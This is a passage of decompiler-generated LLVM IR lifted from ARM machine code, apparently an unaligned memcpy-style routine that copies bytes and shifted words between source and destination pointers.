  store i1 %v8_19f34, i1* %cpsr_v.global-to-local, align 1
  %v9_19f34 = icmp slt i32 %v4_19f34, 0
  store i1 %v9_19f34, i1* %cpsr_n.global-to-local, align 1
  %v10_19f34 = icmp eq i32 %v3_19f34, 12
  store i1 %v10_19f34, i1* %cpsr_z.global-to-local, align 1
  br label %.thread114

.thread114:                                       ; preds = %dec_label_pc_19f2c, %bb138
  %v0_19f3c.pre = phi i32 [ %v4_19f34, %bb138 ], [ %v0_19f3c.pre157, %dec_label_pc_19f2c ]
  %v3_19f3098115 = phi i32 [ %v12_19f30, %bb138 ], [ %v3_19f30, %dec_label_pc_19f2c ]
  %v1_19f38 = phi i1 [ %v8_19f34, %bb138 ], [ %v1_19f34, %dec_label_pc_19f2c ]
  %v0_19f38 = phi i1 [ %v9_19f34, %bb138 ], [ %v0_19f34, %dec_label_pc_19f2c ]
  %v2_19f38 = xor i1 %v1_19f38, %v0_19f38
  br i1 %v2_19f38, label %dec_label_pc_19f3c, label %dec_label_pc_19f2c

dec_label_pc_19f3c:                               ; preds = %.thread114, %dec_label_pc_19ee8
  %v4_19f4c = phi i32 [ %v0_19f0093, %dec_label_pc_19ee8 ], [ %v3_19f3098115, %.thread114 ]
  %v0_19f3c = phi i32 [ %v1_19ee8, %dec_label_pc_19ee8 ], [ %v0_19f3c.pre, %.thread114 ]
  %v1_19f3c = add i32 %v0_19f3c, 8
  store i32 %v1_19f3c, i32* %r2.global-to-local, align 4
  %v3_19f3c = sub i32 0, %v0_19f3c
  %v4_19f3c = and i32 %v1_19f3c, %v3_19f3c
  %v5_19f3c = icmp slt i32 %v4_19f3c, 0
  store i1 %v5_19f3c, i1* %cpsr_v.global-to-local, align 1
  %v6_19f3c = icmp slt i32 %v1_19f3c, 0
  store i1 %v6_19f3c, i1* %cpsr_n.global-to-local, align 1
  %v7_19f3c = icmp eq i32 %v1_19f3c, 0
  store i1 %v7_19f3c, i1* %cpsr_z.global-to-local, align 1
  %v2_19f40 = xor i1 %v6_19f3c, %v5_19f3c
  br i1 %v2_19f40, label %bb140, label %dec_label_pc_19f44

dec_label_pc_19f44:                               ; preds = %dec_label_pc_19f3c
  %v1_19f44 = add i32 %v0_19f3c, 4
  store i32 %v1_19f44, i32* %r2.global-to-local, align 4
  %v3_19f44 = sub i32 -5, %v0_19f3c
  %v4_19f44 = and i32 %v3_19f44, %v1_19f3c
  %v5_19f44 = icmp slt i32 %v4_19f44, 0
  store i1 %v5_19f44, i1* %cpsr_v.global-to-local, align 1
  %v6_19f44 = icmp slt i32 %v1_19f44, 0
  store i1 %v6_19f44, i1* %cpsr_n.global-to-local, align 1
  %v7_19f44 = icmp eq i32 %v1_19f3c, 4
  store i1 %v7_19f44, i1* %cpsr_z.global-to-local, align 1
  %v2_19f48 = xor i1 %v6_19f44, %v5_19f44
  %v3_19f48 = load i32, i32* %r1.global-to-local, align 4
  %v4_19f48 = inttoptr i32 %v3_19f48 to i32*
  %v5_19f48 = load i32, i32* %v4_19f48, align 4
  store i32 %v5_19f48, i32* @r3, align 4
  %v7_19f48 = add i32 %v3_19f48, 4
  br i1 %v2_19f48, label %.thread121, label %bb139

.thread121:                                       ; preds = %dec_label_pc_19f44
  store i32 %v7_19f48, i32* %r1.global-to-local, align 4
  %v5_19f4c = inttoptr i32 %v4_19f4c to i32*
  store i32 %v5_19f48, i32* %v5_19f4c, align 4
  %v6_19f4c = load i32, i32* %r0.global-to-local, align 4
  %v7_19f4c = add i32 %v6_19f4c, 4
  store i32 %v7_19f4c, i32* %r0.global-to-local, align 4
  %v0_19f5c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb140

bb139:                                            ; preds = %dec_label_pc_19f44
  %v7_19f50 = inttoptr i32 %v7_19f48 to i32*
  %v8_19f50 = load i32, i32* %v7_19f50, align 4
  store i32 %v8_19f50, i32* @ip, align 4
  %v9_19f50 = add i32 %v3_19f48, 8
  store i32 %v9_19f50, i32* %r1.global-to-local, align 4
  %v4_19f54 = inttoptr i32 %v4_19f4c to i32*
  store i32 %v5_19f48, i32* %v4_19f54, align 4
  %v6_19f54 = add i32 %v4_19f4c, 4
  %v7_19f54 = inttoptr i32 %v6_19f54 to i32*
  %v8_19f54 = load i32, i32* @ip, align 4
  store i32 %v8_19f54, i32* %v7_19f54, align 4
  %v9_19f54 = add i32 %v4_19f4c, 8
  store i32 %v9_19f54, i32* %r0.global-to-local, align 4
  %v3_19f58 = load i32, i32* %r2.global-to-local, align 4
  %v4_19f58 = add i32 %v3_19f58, -4
  store i32 %v4_19f58, i32* %r2.global-to-local, align 4
  br label %bb140

bb140:                                            ; preds = %.thread121, %.thread127, %dec_label_pc_19f3c, %bb, %dec_label_pc_1a034, %dec_label_pc_1a10c, %dec_label_pc_1a0a0, %bb139
  %v0_19f5c = phi i32 [ %v0_19f5c.pre, %.thread121 ], [ %v2_19fac, %.thread127 ], [ %v1_19f3c, %dec_label_pc_19f3c ], [ %v2_19ed0, %bb ], [ %v0_19f5c60, %dec_label_pc_1a034 ], [ %v0_19f5c59, %dec_label_pc_1a10c ], [ %v0_19f5c58, %dec_label_pc_1a0a0 ], [ %v4_19f58, %bb139 ]
  %v1_19f5c = add i32 %v0_19f5c, 4
  store i32 %v1_19f5c, i32* %r2.global-to-local, align 4
  %v3_19f5c = sub i32 0, %v0_19f5c
  %v4_19f5c = and i32 %v1_19f5c, %v3_19f5c
  %v5_19f5c = icmp slt i32 %v4_19f5c, 0
  store i1 %v5_19f5c, i1* %cpsr_v.global-to-local, align 1
  %v6_19f5c = icmp slt i32 %v1_19f5c, 0
  store i1 %v6_19f5c, i1* %cpsr_n.global-to-local, align 1
  %v7_19f5c = icmp eq i32 %v1_19f5c, 0
  store i1 %v7_19f5c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19f5c, label %bb141, label %bb140.bb142_crit_edge

bb140.bb142_crit_edge:                            ; preds = %bb140
  %v0_19f64.pre = load i32, i32* @r3, align 4
  br label %bb142

bb141:                                            ; preds = %bb140
  %v3_19f60 = load i8*, i8** %stack_var_-8, align 4
  %v4_19f60 = ptrtoint i8* %v3_19f60 to i32
  store i32 %v4_19f60, i32* %r0.global-to-local, align 4
  br label %bb142

bb142:                                            ; preds = %bb140.bb142_crit_edge, %bb141
  %v0_19f64 = phi i32 [ %v0_19f64.pre, %bb140.bb142_crit_edge ], [ %v8_19ecc, %bb141 ]
  call void @__pseudo_cond_branch(i1 %v7_19f5c, i32 %v0_19f64)
  %v0_19f68 = load i32, i32* %r2.global-to-local, align 4
  %v1_19f68 = add i32 %v0_19f68, -2
  %v3_19f68 = sub i32 1, %v0_19f68
  %v4_19f68 = and i32 %v3_19f68, %v0_19f68
  %v5_19f68 = icmp slt i32 %v4_19f68, 0
  store i1 %v5_19f68, i1* %cpsr_v.global-to-local, align 1
  %v6_19f68 = icmp slt i32 %v1_19f68, 0
  store i1 %v6_19f68, i1* %cpsr_n.global-to-local, align 1
  %v7_19f68 = icmp eq i32 %v0_19f68, 2
  store i1 %v7_19f68, i1* %cpsr_z.global-to-local, align 1
  %v0_19f6c = load i32, i32* %r1.global-to-local, align 4
  %v1_19f6c = inttoptr i32 %v0_19f6c to i8*
  %v2_19f6c = load i8, i8* %v1_19f6c, align 1
  %v5_19f6c = add i32 %v0_19f6c, 1
  store i32 %v5_19f6c, i32* %r1.global-to-local, align 4
  %v2_19f70 = load i32, i32* %r0.global-to-local, align 4
  %v3_19f70 = inttoptr i32 %v2_19f70 to i8*
  store i8 %v2_19f6c, i8* %v3_19f70, align 1
  %v4_19f70 = load i32, i32* %r0.global-to-local, align 4
  %v5_19f70 = add i32 %v4_19f70, 1
  store i32 %v5_19f70, i32* %r0.global-to-local, align 4
  %v0_19f74 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_19f74 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_19f74 = xor i1 %v0_19f74, %v1_19f74
  br i1 %v2_19f74, label %.thread124, label %bb143

bb143:                                            ; preds = %bb142
  %v3_19f74 = load i32, i32* %r1.global-to-local, align 4
  %v4_19f74 = inttoptr i32 %v3_19f74 to i8*
  %v5_19f74 = load i8, i8* %v4_19f74, align 1
  %v8_19f74 = add i32 %v3_19f74, 1
  store i32 %v8_19f74, i32* %r1.global-to-local, align 4
  %v6_19f78 = inttoptr i32 %v5_19f70 to i8*
  store i8 %v5_19f74, i8* %v6_19f78, align 1
  %v7_19f78 = load i32, i32* %r0.global-to-local, align 4
  %v8_19f78 = add i32 %v7_19f78, 1
  store i32 %v8_19f78, i32* %r0.global-to-local, align 4
  %v1_19f7c.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_19f7c.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread124

.thread124:                                       ; preds = %bb142, %bb143
  %v7_19f80 = phi i32 [ %v8_19f78, %bb143 ], [ %v5_19f70, %bb142 ]
  %v2_19f80 = phi i1 [ %v2_19f7c.pre, %bb143 ], [ %v1_19f74, %bb142 ]
  %v1_19f80 = phi i1 [ %v1_19f7c.pre, %bb143 ], [ %v0_19f74, %bb142 ]
  %v0_19f7c = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_19f7c = xor i1 %v2_19f80, %v1_19f80
  %v4_19f7c = or i1 %v0_19f7c, %v3_19f7c
  br i1 %v4_19f7c, label %.thread125, label %bb144

bb144:                                            ; preds = %.thread124
  %v5_19f7c = load i32, i32* %r1.global-to-local, align 4
  %v6_19f7c = inttoptr i32 %v5_19f7c to i8*
  %v7_19f7c = load i8, i8* %v6_19f7c, align 1
  %v10_19f7c = add i32 %v5_19f7c, 1
  store i32 %v10_19f7c, i32* %r1.global-to-local, align 4
  %v8_19f80 = inttoptr i32 %v7_19f80 to i8*
  store i8 %v7_19f7c, i8* %v8_19f80, align 1
  %v9_19f80 = load i32, i32* %r0.global-to-local, align 4
  %v10_19f80 = add i32 %v9_19f80, 1
  store i32 %v10_19f80, i32* %r0.global-to-local, align 4
  br label %.thread125

.thread125:                                       ; preds = %.thread124, %bb144
  %v2_19f84 = load i8*, i8** %stack_var_-8, align 4
  %v3_19f84 = ptrtoint i8* %v2_19f84 to i32
  store i32 %v3_19f84, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v8_19ecc)
  %v0_19f8c.pre = load i32, i32* @ip, align 4
  %v0_19f94.pre = load i32, i32* %r1.global-to-local, align 4
  %v2_19f98.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19f8c

dec_label_pc_19f8c:                               ; preds = %dec_label_pc_19ed8, %.thread125
  %v2_19f98 = phi i32 [ %v1_19ec0, %dec_label_pc_19ed8 ], [ %v2_19f98.pre, %.thread125 ]
  %v0_19f94 = phi i32 [ %v0_19ec0, %dec_label_pc_19ed8 ], [ %v0_19f94.pre, %.thread125 ]
  %v0_19f8c = phi i32 [ %v1_19ed8, %dec_label_pc_19ed8 ], [ %v0_19f8c.pre, %.thread125 ]
  %v1_19f8c = sub i32 4, %v0_19f8c
  store i32 %v1_19f8c, i32* @ip, align 4
  %v1_19f90 = add i32 %v1_19f8c, -2
  %v3_19f90 = sub i32 1, %v1_19f8c
  %v4_19f90 = and i32 %v3_19f90, %v1_19f8c
  %v5_19f90 = icmp slt i32 %v4_19f90, 0
  store i1 %v5_19f90, i1* %cpsr_v.global-to-local, align 1
  %v6_19f90 = icmp slt i32 %v1_19f90, 0
  store i1 %v6_19f90, i1* %cpsr_n.global-to-local, align 1
  %v7_19f90 = icmp eq i32 %v1_19f8c, 2
  store i1 %v7_19f90, i1* %cpsr_z.global-to-local, align 1
  %v1_19f94 = inttoptr i32 %v0_19f94 to i8*
  %v2_19f94 = load i8, i8* %v1_19f94, align 1
  %v3_19f94 = zext i8 %v2_19f94 to i32
  store i32 %v3_19f94, i32* @r3, align 4
  %v5_19f94 = add i32 %v0_19f94, 1
  store i32 %v5_19f94, i32* %r1.global-to-local, align 4
  %v3_19f98 = inttoptr i32 %v2_19f98 to i8*
  store i8 %v2_19f94, i8* %v3_19f98, align 1
  %v4_19f98 = load i32, i32* %r0.global-to-local, align 4
  %v5_19f98 = add i32 %v4_19f98, 1
  store i32 %v5_19f98, i32* %r0.global-to-local, align 4
  %v0_19f9c = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_19f9c = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_19f9c = xor i1 %v0_19f9c, %v1_19f9c
  br i1 %v2_19f9c, label %.thread126, label %bb145

bb145:                                            ; preds = %dec_label_pc_19f8c
  %v3_19f9c = load i32, i32* %r1.global-to-local, align 4
  %v4_19f9c = inttoptr i32 %v3_19f9c to i8*
  %v5_19f9c = load i8, i8* %v4_19f9c, align 1
  %v6_19f9c = zext i8 %v5_19f9c to i32
  store i32 %v6_19f9c, i32* @r3, align 4
  %v8_19f9c = add i32 %v3_19f9c, 1
  store i32 %v8_19f9c, i32* %r1.global-to-local, align 4
  %v6_19fa0 = inttoptr i32 %v5_19f98 to i8*
  store i8 %v5_19f9c, i8* %v6_19fa0, align 1
  %v7_19fa0 = load i32, i32* %r0.global-to-local, align 4
  %v8_19fa0 = add i32 %v7_19fa0, 1
  store i32 %v8_19fa0, i32* %r0.global-to-local, align 4
  %v1_19fa4.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_19fa4.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread126

.thread126:                                       ; preds = %dec_label_pc_19f8c, %bb145
  %v7_19fa8 = phi i32 [ %v8_19fa0, %bb145 ], [ %v5_19f98, %dec_label_pc_19f8c ]
  %v2_19fa8 = phi i1 [ %v2_19fa4.pre, %bb145 ], [ %v1_19f9c, %dec_label_pc_19f8c ]
  %v1_19fa8 = phi i1 [ %v1_19fa4.pre, %bb145 ], [ %v0_19f9c, %dec_label_pc_19f8c ]
  %v0_19fa4 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_19fa4 = xor i1 %v2_19fa8, %v1_19fa8
  %v4_19fa4 = or i1 %v0_19fa4, %v3_19fa4
  br i1 %v4_19fa4, label %.thread127, label %bb146

bb146:                                            ; preds = %.thread126
  %v5_19fa4 = load i32, i32* %r1.global-to-local, align 4
  %v6_19fa4 = inttoptr i32 %v5_19fa4 to i8*
  %v7_19fa4 = load i8, i8* %v6_19fa4, align 1
  %v8_19fa4 = zext i8 %v7_19fa4 to i32
  store i32 %v8_19fa4, i32* @r3, align 4
  %v10_19fa4 = add i32 %v5_19fa4, 1
  store i32 %v10_19fa4, i32* %r1.global-to-local, align 4
  %v8_19fa8 = inttoptr i32 %v7_19fa8 to i8*
  store i8 %v7_19fa4, i8* %v8_19fa8, align 1
  %v9_19fa8 = load i32, i32* %r0.global-to-local, align 4
  %v10_19fa8 = add i32 %v9_19fa8, 1
  store i32 %v10_19fa8, i32* %r0.global-to-local, align 4
  br label %.thread127

.thread127:                                       ; preds = %.thread126, %bb146
  %v0_1a0dc76 = phi i32 [ %v10_19fa8, %bb146 ], [ %v7_19fa8, %.thread126 ]
  %v0_19fac = load i32, i32* %r2.global-to-local, align 4
  %v1_19fac = load i32, i32* @ip, align 4
  %v2_19fac = sub i32 %v0_19fac, %v1_19fac
  store i32 %v2_19fac, i32* %r2.global-to-local, align 4
  %v4_19fac = xor i32 %v1_19fac, %v0_19fac
  %v5_19fac = xor i32 %v2_19fac, %v0_19fac
  %v6_19fac = and i32 %v5_19fac, %v4_19fac
  %v7_19fac = icmp slt i32 %v6_19fac, 0
  store i1 %v7_19fac, i1* %cpsr_v.global-to-local, align 1
  %v8_19fac = icmp slt i32 %v2_19fac, 0
  store i1 %v8_19fac, i1* %cpsr_n.global-to-local, align 1
  %v9_19fac = icmp eq i32 %v0_19fac, %v1_19fac
  store i1 %v9_19fac, i1* %cpsr_z.global-to-local, align 1
  %v2_19fb0 = xor i1 %v8_19fac, %v7_19fac
  br i1 %v2_19fb0, label %bb140, label %dec_label_pc_19fb4

dec_label_pc_19fb4:                               ; preds = %.thread127
  %v0_19fb4 = load i32, i32* %r1.global-to-local, align 4
  %v1_19fb4 = urem i32 %v0_19fb4, 4
  store i32 %v1_19fb4, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_19fb4 = icmp eq i32 %v1_19fb4, 0
  store i1 %v2_19fb4, i1* %cpsr_z.global-to-local, align 1
  %extract.t130 = trunc i32 %v0_19fb4 to i2
  br i1 %v2_19fb4, label %dec_label_pc_19ee8, label %dec_label_pc_19fbc

dec_label_pc_19fbc:                               ; preds = %dec_label_pc_19ee0, %dec_label_pc_19fb4
  %v0_1a0dc75 = phi i32 [ %v1_19ec0, %dec_label_pc_19ee0 ], [ %v0_1a0dc76, %dec_label_pc_19fb4 ]
  %v0_1a044 = phi i32 [ %v2_19ed0, %dec_label_pc_19ee0 ], [ %v2_19fac, %dec_label_pc_19fb4 ]
  %v0_19fc4.off0 = phi i2 [ %extract.t, %dec_label_pc_19ee0 ], [ %extract.t130, %dec_label_pc_19fb4 ]
  %v0_19fbc = phi i32 [ %v0_19ec0, %dec_label_pc_19ee0 ], [ %v0_19fb4, %dec_label_pc_19fb4 ]
  %v1_19fbc = and i32 %v0_19fbc, -4
  store i32 %v1_19fbc, i32* %r1.global-to-local, align 4
  %v1_19fc0 = inttoptr i32 %v1_19fbc to i32*
  %v2_19fc0 = load i32, i32* %v1_19fc0, align 4
  store i32 %v2_19fc0, i32* %lr.global-to-local, align 4
  %v4_19fc0 = add i32 %v1_19fbc, 4
  store i32 %v4_19fc0, i32* %r1.global-to-local, align 4
  %v1_1a03c = add i32 %v0_1a044, -12
  %v3_1a03c = sub i32 11, %v0_1a044
  %v4_1a03c = and i32 %v3_1a03c, %v0_1a044
  %v5_1a03c = icmp slt i32 %v4_1a03c, 0
  store i1 %v5_1a03c, i1* %cpsr_v.global-to-local, align 1
  %v6_1a03c = icmp slt i32 %v1_1a03c, 0
  store i1 %v6_1a03c, i1* %cpsr_n.global-to-local, align 1
  %v7_1a03c = icmp eq i32 %v0_1a044, 12
  store i1 %v7_1a03c, i1* %cpsr_z.global-to-local, align 1
  %v2_1a040 = xor i1 %v6_1a03c, %v5_1a03c
  switch i2 %v0_19fc4.off0, label %dec_label_pc_19fd0 [
    i2 -1, label %dec_label_pc_1a0a8
    i2 -2, label %dec_label_pc_1a03c
  ]

dec_label_pc_19fd0:                               ; preds = %dec_label_pc_19fbc
  br i1 %v2_1a040, label %dec_label_pc_1a01c, label %dec_label_pc_19fd8

dec_label_pc_19fd8:                               ; preds = %dec_label_pc_19fd0
  store i32 %v1_1a03c, i32* %r2.global-to-local, align 4
  %v3_19fdc = load i32, i32* @r4, align 4
  store i32 %v3_19fdc, i32* %stack_var_-16, align 4
  %v6_19fdc = load i32, i32* @r5, align 4
  store i32 %v6_19fdc, i32* %stack_var_-12, align 4
  br label %dec_label_pc_19fe0

dec_label_pc_19fe0:                               ; preds = %dec_label_pc_19fe0.dec_label_pc_19fe0_crit_edge, %dec_label_pc_19fd8
  %v0_1a004 = phi i32 [ %v12_1a004, %dec_label_pc_19fe0.dec_label_pc_19fe0_crit_edge ], [ %v0_1a0dc75, %dec_label_pc_19fd8 ]
  %v0_19fe4 = phi i32 [ %v0_19fe4.pre, %dec_label_pc_19fe0.dec_label_pc_19fe0_crit_edge ], [ %v4_19fc0, %dec_label_pc_19fd8 ]
  %v0_19fe0 = phi i32 [ %v0_19fe0.pre, %dec_label_pc_19fe0.dec_label_pc_19fe0_crit_edge ], [ %v2_19fc0, %dec_label_pc_19fd8 ]
  %v3_19fe0 = udiv i32 %v0_19fe0, 256
  %v1_19fe4 = inttoptr i32 %v0_19fe4 to i32*
  %v2_19fe4 = load i32, i32* %v1_19fe4, align 4
  store i32 %v2_19fe4, i32* %r4.global-to-local, align 4
  %v3_19fe4 = add i32 %v0_19fe4, 4
  %v4_19fe4 = inttoptr i32 %v3_19fe4 to i32*
  %v5_19fe4 = load i32, i32* %v4_19fe4, align 4
  store i32 %v5_19fe4, i32* %r5.global-to-local, align 4
  %v6_19fe4 = add i32 %v0_19fe4, 8
  %v7_19fe4 = inttoptr i32 %v6_19fe4 to i32*
  %v8_19fe4 = load i32, i32* %v7_19fe4, align 4
  store i32 %v8_19fe4, i32* %ip.global-to-local, align 4
  %v9_19fe4 = add i32 %v0_19fe4, 12
  %v10_19fe4 = inttoptr i32 %v9_19fe4 to i32*
  %v11_19fe4 = load i32, i32* %v10_19fe4, align 4
  store i32 %v11_19fe4, i32* %lr.global-to-local, align 4
  %v12_19fe4 = add i32 %v0_19fe4, 16
  store i32 %v12_19fe4, i32* %r1.global-to-local, align 4
  %v4_19fe8 = mul i32 %v2_19fe4, 16777216
  %v5_19fe8 = or i32 %v4_19fe8, %v3_19fe0
  store i32 %v5_19fe8, i32* @r3, align 4
  %v3_19fec = udiv i32 %v2_19fe4, 256
  %v4_19ff0 = mul i32 %v5_19fe4, 16777216
  %v5_19ff0 = or i32 %v4_19ff0, %v3_19fec
  store i32 %v5_19ff0, i32* %r4.global-to-local, align 4
  %v3_19ff4 = udiv i32 %v5_19fe4, 256
  %v4_19ff8 = mul i32 %v8_19fe4, 16777216
  %v5_19ff8 = or i32 %v4_19ff8, %v3_19ff4
  store i32 %v5_19ff8, i32* %r5.global-to-local, align 4
  %v3_19ffc = udiv i32 %v8_19fe4, 256
  %v4_1a000 = mul i32 %v11_19fe4, 16777216
  %v5_1a000 = or i32 %v4_1a000, %v3_19ffc
  store i32 %v5_1a000, i32* @ip, align 4
  %v1_1a004 = inttoptr i32 %v0_1a004 to i32*
  store i32 %v5_19fe8, i32* %v1_1a004, align 4
  %v3_1a004 = add i32 %v0_1a004, 4
  %v4_1a004 = inttoptr i32 %v3_1a004 to i32*
  %v5_1a004 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_1a004, i32* %v4_1a004, align 4
  %v6_1a004 = add i32 %v0_1a004, 8
  %v7_1a004 = inttoptr i32 %v6_1a004 to i32*
  %v8_1a004 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_1a004, i32* %v7_1a004, align 4
  %v9_1a004 = add i32 %v0_1a004, 12
  %v10_1a004 = inttoptr i32 %v9_1a004 to i32*
  %v11_1a004 = load i32, i32* @ip, align 4
  store i32 %v11_1a004, i32* %v10_1a004, align 4
  %v12_1a004 = add i32 %v0_1a004, 16
  store i32 %v12_1a004, i32* %r0.global-to-local, align 4
  %v0_1a008 = load i32, i32* %r2.global-to-local, align 4
  %v1_1a008 = add i32 %v0_1a008, -16
  store i32 %v1_1a008, i32* %r2.global-to-local, align 4
  %v3_1a008 = sub i32 15, %v0_1a008
  %v4_1a008 = and i32 %v3_1a008, %v0_1a008
  %v5_1a008 = icmp slt i32 %v4_1a008, 0
  %v6_1a008 = icmp slt i32 %v1_1a008, 0
  %v2_1a00c = xor i1 %v6_1a008, %v5_1a008
  br i1 %v2_1a00c, label %dec_label_pc_1a010, label %dec_label_pc_19fe0.dec_label_pc_19fe0_crit_edge

dec_label_pc_19fe0.dec_label_pc_19fe0_crit_edge:  ; preds = %dec_label_pc_19fe0
  %v0_19fe0.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_19fe4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_19fe0

dec_label_pc_1a010:                               ; preds = %dec_label_pc_19fe0
  %v2_1a010 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1a010, i32* @r4, align 4
  %v5_1a010 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_1a010, i32* @r5, align 4
  %v1_1a014 = add i32 %v0_1a008, -4
  store i32 %v1_1a014, i32* %r2.global-to-local, align 4
  %v3_1a014 = add i32 %v0_1a008, 2147483632
  %v4_1a014 = and i32 %v1_1a014, %v3_1a014
  %v5_1a014 = icmp slt i32 %v4_1a014, 0
  store i1 %v5_1a014, i1* %cpsr_v.global-to-local, align 1
  %v6_1a014 = icmp slt i32 %v1_1a014, 0
  store i1 %v6_1a014, i1* %cpsr_n.global-to-local, align 1
  %v7_1a014 = icmp eq i32 %v1_1a014, 0
  store i1 %v7_1a014, i1* %cpsr_z.global-to-local, align 1
  %v2_1a018 = xor i1 %v6_1a014, %v5_1a014
  br i1 %v2_1a018, label %dec_label_pc_1a034, label %dec_label_pc_1a01c

dec_label_pc_1a01c:                               ; preds = %dec_label_pc_1a010, %dec_label_pc_19fd0, %dec_label_pc_1a01c
  %v1_1a028 = phi i32 [ %v4_1a028, %dec_label_pc_1a01c ], [ %v12_1a004, %dec_label_pc_1a010 ], [ %v0_1a0dc75, %dec_label_pc_19fd0 ]
  %v0_1a01c = load i32, i32* %lr.global-to-local, align 4
  %v3_1a01c = udiv i32 %v0_1a01c, 256
  store i32 %v3_1a01c, i32* %ip.global-to-local, align 4
  %v0_1a020 = load i32, i32* %r1.global-to-local, align 4
  %v1_1a020 = inttoptr i32 %v0_1a020 to i32*
  %v2_1a020 = load i32, i32* %v1_1a020, align 4
  store i32 %v2_1a020, i32* %lr.global-to-local, align 4
  %v4_1a020 = add i32 %v0_1a020, 4
  store i32 %v4_1a020, i32* %r1.global-to-local, align 4
  %v4_1a024 = mul i32 %v2_1a020, 16777216
  %v5_1a024 = or i32 %v4_1a024, %v3_1a01c
  store i32 %v5_1a024, i32* @ip, align 4
  %v2_1a028 = inttoptr i32 %v1_1a028 to i32*
  store i32 %v5_1a024, i32* %v2_1a028, align 4
  %v3_1a028 = load i32, i32* %r0.global-to-local, align 4
  %v4_1a028 = add i32 %v3_1a028, 4
  store i32 %v4_1a028, i32* %r0.global-to-local, align 4
  %v0_1a02c = load i32, i32* %r2.global-to-local, align 4
  %v1_1a02c = add i32 %v0_1a02c, -4
  store i32 %v1_1a02c, i32* %r2.global-to-local, align 4
  %v3_1a02c = sub i32 3, %v0_1a02c
  %v4_1a02c = and i32 %v3_1a02c, %v0_1a02c
  %v5_1a02c = icmp slt i32 %v4_1a02c, 0
  %v6_1a02c = icmp slt i32 %v1_1a02c, 0
  %v2_1a030 = xor i1 %v6_1a02c, %v5_1a02c
  br i1 %v2_1a030, label %dec_label_pc_1a034.loopexit, label %dec_label_pc_1a01c

dec_label_pc_1a034.loopexit:                      ; preds = %dec_label_pc_1a01c
  %v7_1a02c = icmp eq i32 %v0_1a02c, 4
  store i1 %v5_1a02c, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_1a02c, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_1a02c, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1a034

dec_label_pc_1a034:                               ; preds = %dec_label_pc_1a034.loopexit, %dec_label_pc_1a010
  %v0_19f5c60 = phi i32 [ %v1_1a02c, %dec_label_pc_1a034.loopexit ], [ %v1_1a014, %dec_label_pc_1a010 ]
  %v0_1a034 = load i32, i32* %r1.global-to-local, align 4
  %v1_1a034 = add i32 %v0_1a034, -3
  store i32 %v1_1a034, i32* %r1.global-to-local, align 4
  br label %bb140

dec_label_pc_1a03c:                               ; preds = %dec_label_pc_19fbc
  br i1 %v2_1a040, label %dec_label_pc_1a088, label %dec_label_pc_1a044

dec_label_pc_1a044:                               ; preds = %dec_label_pc_1a03c
  store i32 %v1_1a03c, i32* %r2.global-to-local, align 4
  %v3_1a048 = load i32, i32* @r4, align 4
  store i32 %v3_1a048, i32* %stack_var_-16, align 4
  %v6_1a048 = load i32, i32* @r5, align 4
  store i32 %v6_1a048, i32* %stack_var_-12, align 4
  br label %dec_label_pc_1a04c

dec_label_pc_1a04c:                               ; preds = %dec_label_pc_1a04c.dec_label_pc_1a04c_crit_edge, %dec_label_pc_1a044
  %v0_1a070 = phi i32 [ %v12_1a070, %dec_label_pc_1a04c.dec_label_pc_1a04c_crit_edge ], [ %v0_1a0dc75, %dec_label_pc_1a044 ]
  %v0_1a050 = phi i32 [ %v0_1a050.pre, %dec_label_pc_1a04c.dec_label_pc_1a04c_crit_edge ], [ %v4_19fc0, %dec_label_pc_1a044 ]
  %v0_1a04c = phi i32 [ %v0_1a04c.pre, %dec_label_pc_1a04c.dec_label_pc_1a04c_crit_edge ], [ %v2_19fc0, %dec_label_pc_1a044 ]
  %v3_1a04c = udiv i32 %v0_1a04c, 65536
  %v1_1a050 = inttoptr i32 %v0_1a050 to i32*
  %v2_1a050 = load i32, i32* %v1_1a050, align 4
  store i32 %v2_1a050, i32* %r4.global-to-local, align 4
  %v3_1a050 = add i32 %v0_1a050, 4
  %v4_1a050 = inttoptr i32 %v3_1a050 to i32*
  %v5_1a050 = load i32, i32* %v4_1a050, align 4
  store i32 %v5_1a050, i32* %r5.global-to-local, align 4
  %v6_1a050 = add i32 %v0_1a050, 8
  %v7_1a050 = inttoptr i32 %v6_1a050 to i32*
  %v8_1a050 = load i32, i32* %v7_1a050, align 4
  store i32 %v8_1a050, i32* %ip.global-to-local, align 4
  %v9_1a050 = add i32 %v0_1a050, 12
  %v10_1a050 = inttoptr i32 %v9_1a050 to i32*
  %v11_1a050 = load i32, i32* %v10_1a050, align 4
  store i32 %v11_1a050, i32* %lr.global-to-local, align 4
  %v12_1a050 = add i32 %v0_1a050, 16
  store i32 %v12_1a050, i32* %r1.global-to-local, align 4
  %v4_1a054 = mul i32 %v2_1a050, 65536
  %v5_1a054 = or i32 %v4_1a054, %v3_1a04c
  store i32 %v5_1a054, i32* @r3, align 4
  %v3_1a058 = udiv i32 %v2_1a050, 65536
  %v4_1a05c = mul i32 %v5_1a050, 65536
  %v5_1a05c = or i32 %v4_1a05c, %v3_1a058
  store i32 %v5_1a05c, i32* %r4.global-to-local, align 4
  %v3_1a060 = udiv i32 %v5_1a050, 65536
  %v4_1a064 = mul i32 %v8_1a050, 65536
  %v5_1a064 = or i32 %v4_1a064, %v3_1a060
